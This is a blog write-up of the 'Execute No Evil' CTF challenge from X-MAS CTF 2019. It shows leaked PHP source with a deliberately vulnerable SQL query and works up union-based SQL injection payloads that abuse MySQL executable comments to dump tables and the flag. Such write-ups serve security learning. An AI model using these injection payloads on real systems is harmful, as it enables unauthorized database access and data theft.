<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="Execute No Evil was another challenge, simple yet pain. Read about it here.">
<meta property="og:type" content="article">
<meta property="og:title" content="Solving Execute No Evil from X-MAS CTF 2019">
<meta property="og:url" content="http://securitytaters.github.io/solving-execute-no-evil-from-x-mas-ctf-2019/">
<meta property="og:site_name" content="securitytaters">
<meta property="og:description" content="Execute No Evil was another challenge, simple yet pain. Read about it here.">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://securitytaters.github.io/solving-execute-no-evil-from-x-mas-ctf-2019/2.1.jpg">
<meta property="og:image" content="http://securitytaters.github.io/solving-execute-no-evil-from-x-mas-ctf-2019/2.2.jpg">
<meta property="og:image" content="http://securitytaters.github.io/solving-execute-no-evil-from-x-mas-ctf-2019/2.3.jpg">
<meta property="og:image" content="http://securitytaters.github.io/solving-execute-no-evil-from-x-mas-ctf-2019/2.4.jpg">
<meta property="og:image" content="http://securitytaters.github.io/solving-execute-no-evil-from-x-mas-ctf-2019/2.5.jpg">
<meta property="article:published_time" content="2019-12-21T04:30:00.000Z">
<meta property="article:modified_time" content="2025-08-10T09:25:33.117Z">
<meta property="article:author" content="0xm4v3rick">
<meta property="article:tag" content="webappsec">
<meta property="article:tag" content="writeup">
<meta property="article:tag" content="sql injection">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://securitytaters.github.io/solving-execute-no-evil-from-x-mas-ctf-2019/2.1.jpg">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>Solving Execute No Evil from X-MAS CTF 2019</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Archive</a></li><!--
     --><!--
       --><li><a href="/tags/">Tags</a></li><!--
     --><!--
       --><li><a href="/categories/">Categories</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="http://github.com/securitytaters">Projects</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/solving-my-bank-from-hacktm-ctf-quals-2020/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/solving-roboworld-from-x-mas-ctf-2019/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://securitytaters.github.io/solving-execute-no-evil-from-x-mas-ctf-2019/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://securitytaters.github.io/solving-execute-no-evil-from-x-mas-ctf-2019/&text=Solving Execute No Evil from X-MAS CTF 2019"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://securitytaters.github.io/solving-execute-no-evil-from-x-mas-ctf-2019/&title=Solving Execute No Evil from X-MAS CTF 2019"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://securitytaters.github.io/solving-execute-no-evil-from-x-mas-ctf-2019/&is_video=false&description=Solving Execute No Evil from X-MAS CTF 2019"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Solving Execute No Evil from X-MAS CTF 2019&body=Check out this article: http://securitytaters.github.io/solving-execute-no-evil-from-x-mas-ctf-2019/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://securitytaters.github.io/solving-execute-no-evil-from-x-mas-ctf-2019/&title=Solving Execute No Evil from X-MAS CTF 2019"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://securitytaters.github.io/solving-execute-no-evil-from-x-mas-ctf-2019/&title=Solving Execute No Evil from X-MAS CTF 2019"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://securitytaters.github.io/solving-execute-no-evil-from-x-mas-ctf-2019/&title=Solving Execute No Evil from X-MAS CTF 2019"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://securitytaters.github.io/solving-execute-no-evil-from-x-mas-ctf-2019/&title=Solving Execute No Evil from X-MAS CTF 2019"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://securitytaters.github.io/solving-execute-no-evil-from-x-mas-ctf-2019/&name=Solving Execute No Evil from X-MAS CTF 2019&description=Execute No Evil was another challenge, simple yet pain. Read about it here."><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://securitytaters.github.io/solving-execute-no-evil-from-x-mas-ctf-2019/&t=Solving Execute No Evil from X-MAS CTF 2019"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        Solving Execute No Evil from X-MAS CTF 2019
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
	<p>Author : 
        <span class="p-name" itemprop="name">0xm4v3rick</span>
	</p>
      </span>
      
    <div class="postdate">
      
        Created: <time datetime="2019-12-21T04:30:00.000Z" class="dt-published" itemprop="datePublished">21-12-2019</time>
        
        
      
    </div>


      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categories/CTF/">CTF</a>
    </div>


      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/sql-injection/" rel="tag">sql injection</a>, <a class="p-category" href="/tags/webappsec/" rel="tag">webappsec</a>, <a class="p-category" href="/tags/writeup/" rel="tag">writeup</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <p>The author note for this CTF challenge.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(1) New Message: &quot;Hey dude. So we have this database system at work and I just found an SQL injection point. I quickly fixed it by commenting out all the user input in the query. </span><br><span class="line">Don&#x27;t worry, I made the query so that it responds with boss&#x27;s profile, since he is kind of the only person actively using this database system, and he always looks up his own name, lol. </span><br><span class="line">Anyway, guess we&#x27;ll go with this til&#x27; the sysadmin comes and fixes the issue.&quot;</span><br><span class="line"></span><br><span class="line">Huh, so hear no evil, see no evil, ... execute no evil?</span><br><span class="line"></span><br><span class="line">Remote server: http://challs.xmas.htsp.ro:11002</span><br><span class="line">Author: Milkdrop</span><br></pre></td></tr></table></figure>

<p>Browsing through the site shows a search page. Any simple input gives the same output as below:<br><img src="/solving-execute-no-evil-from-x-mas-ctf-2019/2.1.jpg" alt="alt"></p>
<p>Viewing through the html source shows an interesting comment at line 12.</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">href</span>=<span class="string">&quot;style.css&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">class</span>=<span class="string">&quot;center&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Cobalt Inc. employee database search<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span>&gt;</span>Name:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">autocomplete</span>=<span class="string">&quot;off&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Search&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- ?source=1 --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>Name<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>Description<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>Geronimo<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>People say he owns a Cadillac ...<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>Looks like a parameter and value. Lets try it out. So the URL becomes</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challs.xmas.htsp.ro:11002/?source=1</span><br></pre></td></tr></table></figure>

<p>And the response returned is the backend source code for the index page. Lets go through it in brief.</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span> (<span class="string">&quot;index.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span> ();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> type=<span class="string">&quot;text/css&quot;</span> href=<span class="string">&quot;style.css&quot;</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form <span class="class"><span class="keyword">class</span>=&quot;<span class="title">center</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">h2</span>&gt;<span class="title">Cobalt</span> <span class="title">Inc</span>. <span class="title">employee</span> <span class="title">database</span> <span class="title">search</span>&lt;/<span class="title">h2</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">label</span>&gt;<span class="title">Name</span>:&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">name</span>=&quot;<span class="title">name</span>&quot; <span class="title">autocomplete</span>=&quot;<span class="title">off</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">value</span>=&quot;<span class="title">Search</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">br</span>&gt;</span></span><br><span class="line"><span class="class">&lt;!-- ?<span class="title">source</span>=1 --&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class"><span class="title">include</span> (&quot;<span class="title">config</span>.<span class="title">php</span>&quot;);</span></span><br><span class="line"><span class="class">$<span class="title">conn</span> = <span class="title">new</span> <span class="title">mysqli</span> ($<span class="title">servername</span>, $<span class="title">username</span>, $<span class="title">password</span>, $<span class="title">dbname</span>);</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">if</span> (<span class="title">isset</span> ($<span class="title">_GET</span>[&#x27;<span class="title">name</span>&#x27;])) </span>&#123;</span><br><span class="line">    <span class="variable">$name</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$name</span> = <span class="title function_ invoke__">str_replace</span> (<span class="string">&quot;*&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$name</span>);</span><br><span class="line">    <span class="variable">$records</span> = <span class="title function_ invoke__">mysqli_query</span> (<span class="variable">$conn</span>, <span class="string">&quot;SELECT * FROM users WHERE name=/*&quot;</span> . <span class="variable">$name</span> . <span class="string">&quot;*/ &#x27;Geronimo&#x27;&quot;</span>, MYSQLI_USE_RESULT); <span class="comment">// Don&#x27;t tell boss</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$records</span> === <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span> (<span class="string">&quot;&lt;p&gt;Our servers have run into a query error. Please try again later.&lt;/p&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;table&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string">    &lt;tr&gt;</span></span><br><span class="line"><span class="string">    &lt;th&gt;Name&lt;/th&gt;</span></span><br><span class="line"><span class="string">    &lt;th&gt;Description&lt;/th&gt;</span></span><br><span class="line"><span class="string">    &lt;/tr&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span> (<span class="variable">$records</span>, MYSQLI_ASSOC)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;tr&gt;</span></span><br><span class="line"><span class="string">        &lt;td&gt;&#x27;</span>,<span class="variable">$row</span>[<span class="string">&quot;name&quot;</span>],<span class="string">&#x27;&lt;/td&gt;</span></span><br><span class="line"><span class="string">        &lt;td&gt;&#x27;</span>,<span class="variable">$row</span>[<span class="string">&quot;description&quot;</span>],<span class="string">&#x27;&lt;/td&gt;</span></span><br><span class="line"><span class="string">    &lt;/tr&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;/table&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>Line 1-6 : The php code checks if GET variable source is set, and if so it will call a custom function to disclose the source of index.php.</li>
<li>Line 8-19 : Is same HTML code we saw earlier.</li>
<li>Line 21-23 : Another php code, line 23 creates a mysql connection object with necessary details from config.php included at line 22.</li>
<li>Line 25-28 : The GET parameter name is checked and than str_replace is applied to it replacing all the * and stored in name variable. Next it is used in SELECT mysql statement but commented out so as to not affect the query and ‘Geronimo’ is hardcode at the end of the query to retrieve results at line 28.</li>
<li>Line 30-52 : Line 30 checks if results are retrieved and if so than display it using line 41 else display server query error. Rest of the html code is to display the data in tables form.</li>
</ul>
<p>So from the above code we see that the GET parameter name will consists our attack vector and we need to figure out how to break out of the comments on line 28 so that we can proceed with sql injection. My inital thought was to see if we could somehow bypass the str_replace which is quite common. You would find many resources about the same on the internet. But this challenge was not about bypassing str_replace.</p>
<p>After a lot of searching around and trying it out locally, eventually I figured out the string that broke the SQL statement was !&#x2F; . Resulting response was the error that I wanted in below image. A few references that helped me are here</p>
<p><a target="_blank" rel="noopener" href="https://websec.files.wordpress.com/2010/11/sqli2.pdf">SQLi filter evasion and obfuscation PDF</a> : Page 7 last 2 lines.</p>
<p><a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/refman/8.0/en/comments.html">MySQL C-style comments</a></p>
<p><img src="/solving-execute-no-evil-from-x-mas-ctf-2019/2.2.jpg" alt="alt"></p>
<p>That is when I knew I had cracked the code :D. After breaking it again with !’ and completing the query with !’’ below query gave a way to retrieve data. Standard error based sqli payload.</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challs.xmas.htsp.ro:11002/?name=!&#x27;&#x27; union select 1,database(),3</span><br></pre></td></tr></table></figure>
<p>The next problem was to get other data such as tables names, columns and so on as payloads such as below resulted in breaking the query. Commenting out the last part didn’t work or I couldn’t get it to work.</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challs.xmas.htsp.ro:11002/?name=!&#x27;a&#x27; union select 1,table_name,3 from information_schema.tables</span><br></pre></td></tr></table></figure>

<p>The trick was to figure out what was breaking it. It turns out that the ‘Geronimo’ at the end of that statement broke the query. But we could use it in our query as it gets appended to our query as below.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challs.xmas.htsp.ro:11002/?name=!&#x27;&#x27; union select 1,database(),&#x27;3&#x27;</span><br></pre></td></tr></table></figure>
<p><img src="/solving-execute-no-evil-from-x-mas-ctf-2019/2.3.jpg" alt="alt"></p>
<p>Now we need to make that part irrelevant to our query. This is where some of my mysql knowledge helped me out. I could use it to form a payload as below.</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challs.xmas.htsp.ro:11002/?name=!&#x27;&#x27; union select 1,table_name,3 from information_schema.tables where table_name!=</span><br></pre></td></tr></table></figure>
<p>which would create a mysql query like</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE name=/*!&#x27;&#x27; union select 1,table_name,3 from information_schema.tables where table_name!=*/ &#x27;Geronimo&#x27;</span><br></pre></td></tr></table></figure>
<p>and results into<br><img src="/solving-execute-no-evil-from-x-mas-ctf-2019/2.4.jpg" alt="alt"><br>From here it was easy to retrieve columns and eventually the flag. Query for flag is a below.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challs.xmas.htsp.ro:11002/?name=!&#x27;&#x27; union select 1,whatsthis,3 from flag where whatsthis!=</span><br></pre></td></tr></table></figure>
<p>Response:<br><img src="/solving-execute-no-evil-from-x-mas-ctf-2019/2.5.jpg" alt="alt"></p>
<p>It was a good challenge and thanks X-MAS CTF team for it :).<br>Feel free to ping me on twitter for feedback or queries</p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Archive</a></li>
        
          <li><a href="/tags/">Tags</a></li>
        
          <li><a href="/categories/">Categories</a></li>
        
          <li><a href="/search/">Search</a></li>
        
          <li><a target="_blank" rel="noopener" href="http://github.com/securitytaters">Projects</a></li>
        
      </ul>
    </div>

    
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://securitytaters.github.io/solving-execute-no-evil-from-x-mas-ctf-2019/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://securitytaters.github.io/solving-execute-no-evil-from-x-mas-ctf-2019/&text=Solving Execute No Evil from X-MAS CTF 2019"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://securitytaters.github.io/solving-execute-no-evil-from-x-mas-ctf-2019/&title=Solving Execute No Evil from X-MAS CTF 2019"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://securitytaters.github.io/solving-execute-no-evil-from-x-mas-ctf-2019/&is_video=false&description=Solving Execute No Evil from X-MAS CTF 2019"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Solving Execute No Evil from X-MAS CTF 2019&body=Check out this article: http://securitytaters.github.io/solving-execute-no-evil-from-x-mas-ctf-2019/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://securitytaters.github.io/solving-execute-no-evil-from-x-mas-ctf-2019/&title=Solving Execute No Evil from X-MAS CTF 2019"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://securitytaters.github.io/solving-execute-no-evil-from-x-mas-ctf-2019/&title=Solving Execute No Evil from X-MAS CTF 2019"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://securitytaters.github.io/solving-execute-no-evil-from-x-mas-ctf-2019/&title=Solving Execute No Evil from X-MAS CTF 2019"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://securitytaters.github.io/solving-execute-no-evil-from-x-mas-ctf-2019/&title=Solving Execute No Evil from X-MAS CTF 2019"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://securitytaters.github.io/solving-execute-no-evil-from-x-mas-ctf-2019/&name=Solving Execute No Evil from X-MAS CTF 2019&description=Execute No Evil was another challenge, simple yet pain. Read about it here."><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://securitytaters.github.io/solving-execute-no-evil-from-x-mas-ctf-2019/&t=Solving Execute No Evil from X-MAS CTF 2019"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2018-2025
    0xm4v3rick
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Archive</a></li><!--
     --><!--
       --><li><a href="/tags/">Tags</a></li><!--
     --><!--
       --><li><a href="/categories/">Categories</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="http://github.com/securitytaters">Projects</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
